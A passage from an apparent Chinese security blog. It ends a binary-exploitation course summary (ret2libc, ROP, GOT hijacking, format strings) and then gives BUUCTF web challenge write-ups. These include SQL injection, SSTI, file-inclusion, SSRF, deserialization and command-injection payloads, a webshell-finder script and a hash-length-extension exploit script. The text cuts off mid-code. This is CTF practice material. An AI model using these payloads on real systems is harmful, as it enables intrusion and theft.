未被修改，绕过了检查。\nGOT \u0026amp; PLT # 为了更好地理解接下来的攻击技术，这里主要介绍了 Linux 中函数调用时的延迟绑定规则，这就涉及到 ELF 文件中的两个段：.plt 段与 .got.plt 段（实际上，GOT 表被分成 .got 与 .got.plt 两个段，前者与函数无关），分别对应我们的 Procedure Linkage Table 和 Global Offset Table。所谓延迟绑定，即一个函数的真实地址直到其第一次被调用时才会确定。\n我们以 Hello World 程序的 puts 函数调用为例，调用语句是 call \u0026lt;puts@plt\u0026gt;。我们假设 .plt 结构如下：\n图 14 称 .plt 开头的三条指令为 .plt[0]，puts 的 PLT 表是 .plt[1]，那么第一次调用 puts 时会访问 puts@plt 也就是 .plt[1]。.plt[1] 会跳转到 puts 对应的 GOT 表条目 .got.plt[3]。为什么下标是 3？这是因为 .got.plt 段是长这样的：\n图 15 可以看到，.got.plt 的前三条指令不属于任何函数，他们分别存储着：\n.dynamic 动态链接信息 模块 ID 动态链接器中的 dl_runtime_resolve_avx() 函数地址 于是 puts 的 GOT 表项就被挤到下标为 3 的地方去了。\n在第一次调用前，.got.plt[3] 指向 .plt[1] 的下一条指令的地址，也就是说直接让 .plt[1] 继续执行下去，就好像它没有访问过 .got.plt[3] 一样。\n随后，我们的 .plt[1] 的第二条指令会跳转到 .plt[0]，后者再跳转到 .got.plt[2]，也就是 dl_runtime_resolve_avx() 函数的地址去调用该函数，该函数从 libc.so 中拿到 puts 的真实地址，并写入 .got.plt[3] 中。至此，puts 函数的延迟绑定工作完成了。\n接下来，在第 n\u0026gt;=1 次调用中，当我们再次访问 .plt[1] 时，又会去取 .got.plt[3] 中的地址，注意此时这里已经存好了 puts 的真实地址，那么我们就调用成功了。\nret2libc # 这样以后就能介绍 ret2libc 了，这是在没有诸如 system 和 /bin/sh 字符串的情况下，通过返回到 libc 动态链接库中查找 system 函数地址和 /bin/sh 字符串地址，来执行 system(\u0026quot;/bin/sh\u0026quot;) 的攻击。为此，我们需要通过栈溢出泄露出 libc 中某个函数的真实地址，例如 __libc_start_main 等，随后使用 LibcSearcher 搜索出程序使用的 libc 版本，从而获得 libc 基址，以及 system 和 /bin/sh 的偏移量。将基址和偏移相加就可以得到两者的真实地址。这种攻击不仅可以绕过 NX 保护，同时由于 PIE 不会随机化函数地址的低 12 位，而泄露出 __libc_start_main 的低 12 位就可以确定 libc 版本，ret2libc 攻击在 PIE 保护下也不会失效。\nROP \u0026amp; ret2syscall # 同样我们还可以 ret2syscall。我们想做的就是构造系统调用 execve(\u0026quot;/bin/sh\u0026quot;,NULL,NULL)。为此，我们需要：\n让 eax 等于 0xb（execve 的系统调用号） 找到 /bin/sh 字符串的地址 让 ebx 等于 /bin/sh 字符串的地址 让 ecx 和 edx 等于 0 找到 int 0x80 语句的地址，并返回到这句语句上 可以发现，这里我们需要控制寄存器的值，但是我们是无法直接控制的，而是需要通过一些 gadgets 来控制。\n回顾 x86 汇编部分，我们介绍了 push 和 pop 两种对称的操作。然而，没有人规定这两个操作必须成对出现。如果我们先布置好栈顶的值，然后跳转到 pop eax 指令所在的地址并执行，那么栈顶的值就会被赋值给 eax，这样，我们相当于控制了寄存器的值。\n但是，跳转到 pop eax 后，我们还需要控制 ebx 等寄存器，还需要跳转到别的地方，此时的跳转我们同样要通过修改返回地址实现，因此我们必须要有返回语句，也就是 ret。因此 pop eax; ret 这样的语句我们就称之为一个 gadget。\n我们可以通过栈溢出先在栈上布置好我们想 pop 出去的值，通过 ROPgadget 工具寻找一些这样的 gadgets（还可以找 /bin/sh 地址和 int 0x80 地址）也依次放到栈上，那么我们就构造了一条 ROP(Return Oriented Programming) 链：\n| int 0x80 | -------------------------------- | addr of /bin/sh | -------------------------------- | 0 | -------------------------------- | 0 | -------------------------------- | pop edx; pop ecx; pop ebx; ret | -------------------------------- | 0xb | -------------------------------- | pop eax; ret | GOT Hijacking # 栈溢出部分最后介绍的是 GOT Hijacking，也就是 GOT 表劫持。当程序开启 Partial RELRO 时，GOT 表是可写的，那么我们就可以将一个现有的普通函数例如 fflush 的 GOT 表地址放在栈上，随后利用程序漏洞（如 scanf 不加 \u0026amp; 等）向该地址写入另一个地址，如 system(\u0026quot;/bin/sh\u0026quot;) 的地址，那么当我们执行 fflush() 时，由于其 GOT 表已经被劫持到了 system(\u0026quot;/bin/sh\u0026quot;)，实际执行的是后者。\n格式化字符串漏洞 # 课程最后介绍的是格式化字符串漏洞，大家都比较熟悉格式化字符串。其完整格式形如：\n%[parameter][flags][field width][.precision][length]type 这里我们主要关注 parameter 和 type。parameter 处一个广为人知的攻击点是 n$，例如：\nprintf(\u0026#34;%2$d %2$#x; %1$d %1$#x\u0026#34;,16,17) 这句语句中，2$ 就是值格式化字符串后的第 2 个参数。\n类似地，type 中的攻击点在于 %n 这个类型，指定为该类型时，不输出，而是将已成功输出的字符数写入对应的整型指针参数所指的变量。这可以用来写内存，不过课程并没有涉及这一点。\n为了利用该漏洞，首先要理解格式化字符串的工作原理。对于语句；\nprintf(\u0026#34;Color %s, Number %d, Float %4.2f\u0026#34;, \u0026#34;red\u0026#34;, 123456, 3.1416); 会输出\nColor red, Number 123456, Float 3.14 栈上布局为：\n| 3.1416 | ------------------------- | 123456 | ------------------------- | addr of \u0026#34;red\u0026#34; | ------------------------- | addr of \u0026#34;Color %s, ...\u0026#34; | printf 函数在读格式化字符串时，如果遇到 %，那么就会去读取对应位置的参数并解析，这个参数位于栈上。那么，如果我的语句是：\nprintf(\u0026#34;Color %s, Number %d, Float %4.2f\u0026#34;); 即参数个数不匹配，会怎么样呢？\n答案是 printf 照常解析，此时栈上原本应该放参数的那个位置上的内容就会被读取并打印出来。利用这个漏洞，我们就可以泄露栈内存。实际上，可以泄露任意地址内存。\n举个例子，当程序运行时我们发现用户输入的参数被存储在了栈上，并且栈上还有 __libc_start_main 的地址。那么我们可以计算两者在栈上的偏移量 offset，随后：\n除以 4（32 位） 除以 8 后加 6（64 位，别忘了 6 个存参数的寄存器） 得到的就是，__libc_start_main 可以被认为是 printf 的第几个参数。假如是第 11 个参数，那么我们只要构造语句 printf(\u0026quot;%11$p\u0026quot;); 即可泄露 __libc_start_main 的地址，从而实施 ret2libc 攻击。\n参考资料 # https://pwnable.kr/ https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/ https://ctf.bugku.com/challenges https://zhuanlan.zhihu.com/p/25816426 http://security.cs.rpi.edu/courses/binexp-spring2015/ https://ropemporium.com/guide.html 所有使用的工具的官方文档 《深入理解计算机系统》（CS: APP） ","date":"2019-12-05","permalink":"/posts/binary-exp/","section":"Posts","summary":"\u003cp\u003e其实我也刚学。\u003c/p\u003e","title":"水漫金山：《二进制漏洞利用入门》课程总结"},{"content":"偶然发现的 BUUCTF，真的非常好用了。\n[HCTF 2018]WarmUp # F12 发现 source.php 得源码：\n\u0026lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(\u0026amp;$page) { $whitelist = [\u0026#34;source\u0026#34;=\u0026gt;\u0026#34;source.php\u0026#34;,\u0026#34;hint\u0026#34;=\u0026gt;\u0026#34;hint.php\u0026#34;]; if (! isset($page) || !is_string($page)) { echo \u0026#34;you can\u0026#39;t see it\u0026#34;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page .\u0026#39;?\u0026#39;,\u0026#39;?\u0026#39;) ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page .\u0026#39;?\u0026#39;,\u0026#39;?\u0026#39;) ); if (in_array($_page, $whitelist)) { return true; } echo \u0026#34;you can\u0026#39;t see it\u0026#34;; return false; } } if (! empty($_REQUEST[\u0026#39;file\u0026#39;]) \u0026amp;\u0026amp; is_string($_REQUEST[\u0026#39;file\u0026#39;]) \u0026amp;\u0026amp; emmm::checkFile($_REQUEST[\u0026#39;file\u0026#39;]) ) { include $_REQUEST[\u0026#39;file\u0026#39;]; exit; } else { echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;img src=\\\u0026#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\u0026#34;/\u0026gt;\u0026#34;; } ?\u0026gt; 发现存在 hint.php：\nflag not here, and flag in ffffllllaaaagggg 结合上述代码，可以确定是利用文件包含读取 ffffllllaaaagggg 文件。为此，我们需要提供 GET 参数 file。\n注意到 file 参数的值会被经过如下处理：\n$_page = mb_substr( $page, 0, mb_strpos($page .\u0026#39;?\u0026#39;,\u0026#39;?\u0026#39;) ); 那么如果我们在中间插入一个 ?，就可以达到截断的效果。所以尝试 ?file=hint.php?ffffllllaaaagggg 发现无法读取到内容，因此猜测 hint.php? 被当作了文件名的一部分，需要使用相对路径进行目录穿越：\n?file=hint.php?../../../../../ffffllllaaaagggg [强网杯 2019] 随便注 # 单引号可以发现存在注入，但尝试注入时页面返回\nreturn preg_match(\u0026#34;/select|update|delete|drop|insert|where|\\./i\u0026#34;,$inject); 这说明无法通过常规手段进行注入，因此尝试堆叠注入：\n1\u0026#39;;show databases; 1\u0026#39;;show tables; 得到需要的表名 1919810931114514，但是由于 select 等查询关键字被过滤，查字段内容需要另辟蹊径。这里使用了预处理语句：\n1\u0026#39;;sEt @poc=concat(char(115,101,108,101,99,116,32),\u0026#39;* from `1919810931114514`\u0026#39;);prEpare poc from @poc;exEcute poc;# 注意这里可以使用 char 绕过、大小写绕过，并且纯数字表名需要用反引号包起来。\n[护网杯 2018]easy_tornado # 我们需要计算的 hash 是 md5(cookie_secret+md5(filename))，已经获得了 flag 的文件名，还需要 cookie_secret。由于是 tornado 框架，可以尝试 SSTI。\n修改 filehash 进入错误页面 /error?msg=Error，测试发现 msg 存在 SSTI，使用 msg={{handler.settings}} 即可获得 cookie_secret。最后计算 MD5 得 payload：\n/file?filename=/fllllllllllllag\u0026amp;filehash=a47f809c580850840a5562488d72a3df [SUCTF 2019]EasySQL # 源码泄露：\n\u0026lt;?php session_start(); include_once \u0026#34;config.php\u0026#34;; $post = array(); $get = array(); global $MysqlLink; //GetPara(); $MysqlLink = mysqli_connect(\u0026#34;localhost\u0026#34;,$datauser,$datapass); if(!$MysqlLink){ die(\u0026#34;Mysql Connect Error!\u0026#34;); } $selectDB = mysqli_select_db($MysqlLink,$dataName); if(!$selectDB){ die(\u0026#34;Choose Database Error!\u0026#34;); } foreach ($_POST as $k=\u0026gt;$v){ if(!empty($v)\u0026amp;\u0026amp;is_string($v)){ $post[$k] = trim(addslashes($v)); } } foreach ($_GET as $k=\u0026gt;$v){ } } //die(); ?\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;a\u0026gt; Give me your flag, I will tell you if the flag is right. \u0026lt;/ a\u0026gt; \u0026lt;form action=\u0026#34;\u0026#34;method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34;name=\u0026#34;query\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;?php if(isset($post[\u0026#39;query\u0026#39;])){ $BlackList = \u0026#34;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|\u0026amp;|\\\u0026#34;\u0026#34;; //var_dump(preg_match(\u0026#34;/{$BlackList}/is\u0026#34;,$post[\u0026#39;query\u0026#39;])); if(preg_match(\u0026#34;/{$BlackList}/is\u0026#34;,$post[\u0026#39;query\u0026#39;])){ //echo $post[\u0026#39;query\u0026#39;]; die(\u0026#34;Nonono.\u0026#34;); } if(strlen($post[\u0026#39;query\u0026#39;])\u0026gt;40){ die(\u0026#34;Too long.\u0026#34;); } $sql = \u0026#34;select\u0026#34;.$post[\u0026#39;query\u0026#39;].\u0026#34;||flag from Flag\u0026#34;; mysqli_multi_query($MysqlLink,$sql); do{ if($res = mysqli_store_result($MysqlLink)){ while($row = mysqli_fetch_row($res)){ print_r($row); } } }while(@mysqli_next_result($MysqlLink)); } ?\u0026gt; 从 sql 语句可以看出存在堆叠注入，且 flag 被 || 拼接在了输入的后面。因此一种办法是把管道变成连接符，然后查询 1||flag：\n1; set sql_mode=pipes_as_concat;select 1 另一种办法是直接输入 *,1，从而构造 select *,1||flag from Flag，这里的 || 就是默认的或运算。\n[HCTF 2018]admin # 注册时输入 unicode 字符会报错，由于开启了 debug 模式，直接可以拿到 python 的 shell，从 index.html 中读 flag。这个应该是 BUU 平台的非预期。\n实际上，本题预期解是利用 Unicode 同形字，注册 ᴀdmin 并登陆，然后修改密码即可修改 admin 的密码，但是同样出现了很多非预期，具体参考 出题人题解。\n[RoarCTF 2019]Easy Calc # 首页可以发现 js 代码，也就是自定义的 waf：\n$(\u0026#39;#calc\u0026#39;).submit(function(){ $.ajax({ url:\u0026#34;calc.php?num=\u0026#34;+encodeURIComponent($(\u0026#34;#content\u0026#34;).val()), type:\u0026#39;GET\u0026#39;, success:function(data){ $(\u0026#34;#result\u0026#34;).html(`\u0026lt;div class=\u0026#34;alert alert-success\u0026#34;\u0026gt; \u0026lt;strong\u0026gt; 答案:\u0026lt;/strong\u0026gt;${data} \u0026lt;/div\u0026gt;`); }, error:function(){ alert(\u0026#34; 这啥? 算不来!\u0026#34;); } }) return false; }) 可以发现有 calc.php，访问直接得到源码：\n\u0026lt;?php error_reporting(0); if(!isset($_GET[\u0026#39;num\u0026#39;])){ show_source(__FILE__); }else{ $str = $_GET[\u0026#39;num\u0026#39;]; $blacklist = [\u0026#39;\u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;\\r\u0026#39;, \u0026#39;\\n\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;,\u0026#39;\u0026#34;\u0026#39;,\u0026#39;`\u0026#39;,\u0026#39;\\[\u0026#39;,\u0026#39;\\]\u0026#39;,\u0026#39;\\$\u0026#39;,\u0026#39;\\\\\u0026#39;,\u0026#39;\\^\u0026#39;]; foreach ($blacklist as $blackitem) { if (preg_match(\u0026#39;/\u0026#39;. $blackitem .\u0026#39;/m\u0026#39;, $str)) { die(\u0026#34;what are you want to do?\u0026#34;); } } eval(\u0026#39;echo\u0026#39;.$str.\u0026#39;;\u0026#39;); } ?\u0026gt; 绕过 php 黑名单本身不难，但是 waf 中会先进行一次 encodeURIComponent。这里用到的绕过 waf 技巧就是用 num 参数而非 num 参数，这样做可以成功的原因在于 php 会尝试将传入的参数变为合法变量名，即 strip 掉首尾空格、加下划线等等，因此 num 就会被处理成 num，成功进入 else 逻辑，剩下的就是绕黑名单了：\n/calc.php?%20num=var_dump(scandir(chr(47))) 可以发现 flag 文件 /f1agg，同样方法读出即可：\n/calc.php?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) [强网杯 2019] 高明的黑客 # 提供了 www.tar.gz，里面有 3000 + 个 php 文件，都含有类似一句话的部分，但是大多不能用。需要写脚本找到能用的一句话木马：\nimport os import re import requests filenames = os.listdir(\u0026#39;/var/www/html/src\u0026#39;) pattern = re.compile(r\u0026#34;\\$_[GEPOST]{3,4}\\[.*\\]\u0026#34;) for name in filenames: print(name) with open(\u0026#39;/var/www/html/src/\u0026#39;+name,\u0026#39;r\u0026#39;) as f: data = f.read() result = list(set(pattern.findall(data))) for ret in result: try: command = \u0026#39;uname\u0026#39; flag = \u0026#39;Linux\u0026#39; if \u0026#39;GET\u0026#39; in ret: passwd = re.findall(r\u0026#34;\u0026#39;(.*)\u0026#39;\u0026#34;,ret)[0] r = requests.get(url=\u0026#39;http://localhost/\u0026#39;+ name +\u0026#39;?\u0026#39;+ passwd +\u0026#39;=\u0026#39;+ command) if flag in r.text: print(\u0026#39;GET /{}?{}=cat /flag\u0026#39;.format(name,passwd)) break elif \u0026#39;POST\u0026#39; in ret: passwd = re.findall(r\u0026#34;\u0026#39;(.*)\u0026#39;\u0026#34;,ret)[0] r = requests.post(url=\u0026#39;http://localhost/\u0026#39;+ name,data={passwd:command}) if flag in r.text: print(\u0026#39;POST /{}?{}=cat /flag\u0026#39;.format(name,passwd)) break except: pass [SUCTF 2019]CheckIn # 可以上传文件，但是会对后缀名、文件头进行检查，同时文件中不能存在 \u0026lt;?。后者用 \u0026lt;script language=\u0026quot;php\u0026quot;\u0026gt; 就可以绕过，前者可以上传图片马。随后就需要我们去包含这个图片马。\n可以看到上传的文件目录是固定的，同目录下原本就存在 index.php。那么可以尝试上传 .user.ini，令 index.php 中包含上传的图片马。\n如下编写 .user.ini：\nGIF89a auto_prepend_file=1.jpg 这样以后，再访问上传目录下的 index.php 即可。\n[网鼎杯 2018]Fakebook # 首先通过 robots.txt 发现 user.php.bak：\n\u0026lt;?php class UserInfo { public $name = \u0026#34;\u0026#34;; public $age = 0; public $blog = \u0026#34;\u0026#34;; public function __construct($name, $age, $blog) { $this-\u0026gt;name = $name; $this-\u0026gt;age = (int)$age; $this-\u0026gt;blog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () { return $this-\u0026gt;get($this-\u0026gt;blog); } public function isValidBlog () { $blog = $this-\u0026gt;blog; return preg_match(\u0026#34;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\u0026#34;, $blog); } } 可以发现输入的 blog 处存在 SSRF，并且对 blog 字符串的模式做了限制。\n先随便注册一个账号，查看账号信息会访问到 view.php?no=1，这里存在 SQL 注入。\nno=1 and updatexml(1,concat(\u0026#39;~\u0026#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),\u0026#39;~\u0026#39;),1)-- no=1 and updatexml(1,concat(\u0026#39;~\u0026#39;,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39;),\u0026#39;~\u0026#39;),1)-- no=1 and updatexml(1,concat(\u0026#39;~\u0026#39;,(select data from users),\u0026#39;~\u0026#39;),1)-- 可以发现存在 no,username,passwd,data 这些字段，并且 data 字段存放了序列化的 User 对象。\n那么我们可以构造一个 User 使得他的 blog 指向 flag 文件。这样就可以绕过 user.php 的检查。\n构造序列化对象：\n$a = new UserInfo(\u0026#39;merc\u0026#39;,\u0026#39;10\u0026#39;,\u0026#39;file:///var/www/html/flag.php\u0026#39;); echo serialize($a); 另外 union select 被过滤，需要注释绕过。\nno=-1\u0026#39;union/**/select 1,2,3,\u0026#39;O:8:\u0026#34;UserInfo\u0026#34;:3:{s:4:\u0026#34;name\u0026#34;;s:4:\u0026#34;merc\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:10;s:4:\u0026#34;blog\u0026#34;;s:29:\u0026#34;file:///var/www/html/flag.php\u0026#34;;}\u0026#39;-- [De1CTF 2019]SSRF Me # iec\nfrom flask import Flask from flask import request import socket import hashlib import urllib import sys import os import json reload(sys) sys.setdefaultencoding(\u0026#39;latin1\u0026#39;) app = Flask(__name__) secert_key = os.urandom(16) class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = {} result[\u0026#39;code\u0026#39;] = 500 if (self.checkSign()): if \u0026#34;scan\u0026#34; in self.action: tmpfile = open(\u0026#34;./%s/result.txt\u0026#34; % self.sandbox, \u0026#39;w\u0026#39;) resp = scan(self.param) if (resp ==\u0026#34;Connection Timeout\u0026#34;): result[\u0026#39;data\u0026#39;] = resp else: print resp tmpfile.write(resp) tmpfile.close() result[\u0026#39;code\u0026#39;] = 200 if \u0026#34;read\u0026#34; in self.action: f = open(\u0026#34;./%s/result.txt\u0026#34; % self.sandbox, \u0026#39;r\u0026#39;) result[\u0026#39;code\u0026#39;] = 200 result[\u0026#39;data\u0026#39;] = f.read() if result[\u0026#39;code\u0026#39;] == 500: result[\u0026#39;data\u0026#39;] = \u0026#34;Action Error\u0026#34; else: result[\u0026#39;code\u0026#39;] = 500 result[\u0026#39;msg\u0026#39;] = \u0026#34;Sign Error\u0026#34; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False #generate Sign For Action Scan. @app.route(\u0026#34;/geneSign\u0026#34;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def geneSign(): param = urllib.unquote(request.args.get(\u0026#34;param\u0026#34;,\u0026#34;\u0026#34;)) action = \u0026#34;scan\u0026#34; return getSign(action, param) @app.route(\u0026#39;/De1ta\u0026#39;,methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;]) def challenge(): action = urllib.unquote(request.cookies.get(\u0026#34;action\u0026#34;)) param = urllib.unquote(request.args.get(\u0026#34;param\u0026#34;,\u0026#34;\u0026#34;)) sign = urllib.unquote(request.cookies.get(\u0026#34;sign\u0026#34;)) ip = request.remote_addr if(waf(param)): return \u0026#34;No Hacker!!!!\u0026#34; task = Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route(\u0026#39;/\u0026#39;) def index(): return open(\u0026#34;code.txt\u0026#34;,\u0026#34;r\u0026#34;).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return \u0026#34;Connection Timeout\u0026#34; def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check=param.strip().lower() if check.startswith(\u0026#34;gopher\u0026#34;) or check.startswith(\u0026#34;file\u0026#34;): return True else: return False if __name__ == \u0026#39;__main__\u0026#39;: app.debug = False app.run(host=\u0026#39;0.0.0.0\u0026#39;) 两种操作：scan 写入 result.txt，read 读文件。生成签名时将 secret_key 放在最前面，因此可以通过哈希长度扩展攻击在末尾添加一个 read 操作。这样就可以先把 flag.txt 写入 result.txt 再读出来。\n为了读到 flag.txt，很容易想到 file 协议，但是在 waf 中过滤了 file 和 gopher 协议。这里可以利用 urllib 库中的特殊协议 local-file 来读文件，造成 SSRF。\nimport requests import urllib import hashpumpy base = \u0026#39;http://0230c9c3-8270-4e74-9786-e6ab55d01eeb.node3.buuoj.cn/\u0026#39; url = \u0026#39;local-file:flag.txt\u0026#39; r = requests.get(base +\u0026#39;geneSign?param=\u0026#39;+ url) print(r.text) hashcode = hashpumpy.hashpump(r.text, url+\u0026#39;scan\u0026#39;,\u0026#39;read\u0026#39;, 16) print(hashcode) cookies = { \u0026#39;sign\u0026#39;: hashcode[0], \u0026#39;action\u0026#39;: urllib.parse.quote(hashcode[1][len(url):]) } r = requests.get(base +\u0026#39;De1ta?param=\u0026#39;+url, cookies=cookies) print(r.text) [RoarCTF 2019]Easy Java # 容易发现任意文件下载漏洞，我们可以下载 WEB-INF/web.xml，注意必须通过 POST 方式。可以发现存在 FlagController，然后去下载 FlagController：\nfilename=WEB-INF/classes/com/wm/ctf/FlagController.class jd-gui 反编译可以发现 flag 的 base64 编码。\n[0CTF 2016]piapiapia # 扫目录得 www.zip，发现正常注册登陆后可以修改档案，随后查看档案时存在反序列化操作，而其中图片是通过 file_get_contents 获取的，可以用来读关键文件 config.php。\n$profile[\u0026#39;phone\u0026#39;] = $_POST[\u0026#39;phone\u0026#39;]; $profile[\u0026#39;email\u0026#39;] = $_POST[\u0026#39;email\u0026#39;]; $profile[\u0026#39;nickname\u0026#39;] = $_POST[\u0026#39;nickname\u0026#39;]; $profile[\u0026#39;photo\u0026#39;] = \u0026#39;upload/\u0026#39; . md5($file[\u0026#39;name\u0026#39;]); $profile = unserialize($profile); $phone = $profile[\u0026#39;phone\u0026#39;]; $email = $profile[\u0026#39;email\u0026#39;]; $nickname = $profile[\u0026#39;nickname\u0026#39;]; $photo = base64_encode(file_get_contents($profile[\u0026#39;photo\u0026#39;])); 但是在更新档案时，photo 字段前会拼接一个 upload/ 导致无法读到 config.php。那么我们可以考虑向 nickname 注入序列化字符串的末尾部分，使得反序列化时忽略掉原本的 photo 字段。\n但是对于 nickname 又存在过滤：\nif(preg_match(\u0026#39;/[^a-zA-Z0-9_]/\u0026#39;, $_POST[\u0026#39;nickname\u0026#39;]) || strlen($_POST[\u0026#39;nickname\u0026#39;]) \u0026gt; 10) die(\u0026#39;Invalid nickname\u0026#39;); 不过绕过很简单，数组绕过即可。\n最后，为了注入 photo，我们需要额外添加：\n\u0026#34;;}s:5:\u0026#34;photo\u0026#34;;s:10:\u0026#34;config.php 共 31 个字符，因此我们必须让 nickname 在被序列化之前，长度增加 31，否则我们新增的部分就不会被读入。幸运的是，我们有 filter 函数：\npublic function filter($string) { $escape = array(\u0026#39;\\\u0026#39;\u0026#39;,\u0026#39;\\\\\\\\\u0026#39;); $escape = \u0026#39;/\u0026#39; . implode(\u0026#39;|\u0026#39;, $escape) . \u0026#39;/\u0026#39;; $string = preg_replace($escape,\u0026#39;_\u0026#39;, $string); $safe = array(\u0026#39;select\u0026#39;, \u0026#39;insert\u0026#39;, \u0026#39;update\u0026#39;, \u0026#39;delete\u0026#39;, \u0026#39;where\u0026#39;); $safe = \u0026#39;/\u0026#39; . implode(\u0026#39;|\u0026#39;, $safe) . \u0026#39;/i\u0026#39;; return preg_replace($safe,\u0026#39;hacker\u0026#39;, $string); } 可以发现它会将 where 替换为 hacker，使得字符串长度 + 1，那么我们重复该过程 31 次即可。\n最终 payload：\n------WebKitFormBoundary8V1KsQLRGLqfB6An Content-Disposition: form-data; name=\u0026#34;phone\u0026#34; 12345678901 ------WebKitFormBoundary8V1KsQLRGLqfB6An Content-Disposition: form-data; name=\u0026#34;email\u0026#34; admin@admin.com ------WebKitFormBoundary8V1KsQLRGLqfB6An Content-Disposition: form-data; name=\u0026#34;nickname[]\u0026#34; wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\u0026#34;;}s:5:\u0026#34;photo\u0026#34;;s:10:\u0026#34;config.php ------WebKitFormBoundary8V1KsQLRGLqfB6An Content-Disposition: form-data; name=\u0026#34;photo\u0026#34;; filename=\u0026#34;1.png\u0026#34; Content-Type: image/png config.php ------WebKitFormBoundary8V1KsQLRGLqfB6An-- [BUUCTF 2018]Online Tool # 参考文章。\n简单来说，escapeshellarg 会对传入参数中的单引号进行转义，然后将单引号两边的内容用 '' 包起来；而 escapeshellcmd 会对转义符 \\ 以及不成对的单引号进行转义。那么先 escapeshellarg 再 escapeshellcmd 就会造成单引号逃逸。\npayload：\n?host=\u0026#39;\u0026lt;?php echo phpinfo();?\u0026gt; -oG 1.php \u0026#39; 经过 escapeshellarg：\n?host=\u0026#39;\u0026#39;\\\u0026#39; \u0026#39;\u0026lt;?php echo phpinfo();?\u0026gt; -oG 1.php\u0026#39;\\\u0026#39;\u0026#39;\u0026#39; 经过 escapeshellcmd：\n?host=\u0026#39;\u0026#39;\\\\\u0026#39; \u0026#39;\\\u0026lt;\\?php echo phpinfo\\(\\)\\;\\?\\\u0026gt; -oG 1.php\u0026#39;\\\\\u0026#39;\u0026#39;\u0026#39; 然后访问沙箱即可。\n[SUCTF 2019]Pythonginx # @app.route(\u0026#39;/getUrl\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def getUrl(): url = request.args.get(\u0026#34;url\u0026#34;) host = parse.urlparse(url).hostname if host == \u0026#39;suctf.cc\u0026#39;: return \u0026#34;我扌 your problem? 111\u0026#34; parts = list(urlsplit(url)) host = parts[1] if host == \u0026#39;suctf.cc\u0026#39;: return \u0026#34;我扌 your problem? 222\u0026#34; + host newhost = [] for h in host.split(\u0026#39;.\u0026#39;): newhost.append(h.encode(\u0026#39;idna\u0026#39;).decode(\u0026#39;utf-8\u0026#39;)) parts[1] = \u0026#39;.\u0026#39;.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(\u0026#39;\u0026#39;)[0] host = parse.urlparse(finalUrl).hostname if host == \u0026#39;suctf.cc\u0026#39;: return urllib.request.urlopen(finalUrl, timeout=2).read() else: return \u0026#34;我扌 your problem? 333\u0026#34; 题目不允许主机名为 suctf.cc，但是给了提示 h.encode('idna'.decode('utf-8))，可以查到 urllib 相关漏洞，利用 idna 字符 ℆ 即可绕过主机名过滤，使得最终解码得到主机名是 suctf.cc。\n然后，题目还提示了 nginx，因此可以想到用 file 协议读取 nginx 配置文件，得到 flag 位置，恰好也位于 /usr 目录下，因此直接读即可。\n[CISCN2019 华北赛区 Day1 Web1]Dropbox # 参考\n注册后随便上传个文件，然后下载，抓包发现可以改成别的文件，例如 /var/www/html/index.php：\n\u0026lt;?php include \u0026#34;class.php\u0026#34;; $a = new FileList($_SESSION[\u0026#39;sandbox\u0026#39;]); $a-\u0026gt;Name(); $a-\u0026gt;Size(); ?\u0026gt; 这里创建了 FileList 对象，调用了两个方法。\n然后下载 class.php：\n\u0026lt;?php error_reporting(0); $dbaddr = \u0026#34;127.0.0.1\u0026#34;; $dbuser = \u0026#34;root\u0026#34;; $dbpass = \u0026#34;root\u0026#34;; $dbname = \u0026#34;dropbox\u0026#34;; $db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname); class User { public $db; public function __construct() { global $db; $this-\u0026gt;db = $db; } public function user_exist($username) { $stmt = $this-\u0026gt;db-\u0026gt;prepare(\u0026#34;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\u0026#34;); $stmt-\u0026gt;bind_param(\u0026#34;s\u0026#34;, $username); $stmt-\u0026gt;execute(); $stmt-\u0026gt;store_result(); $count = 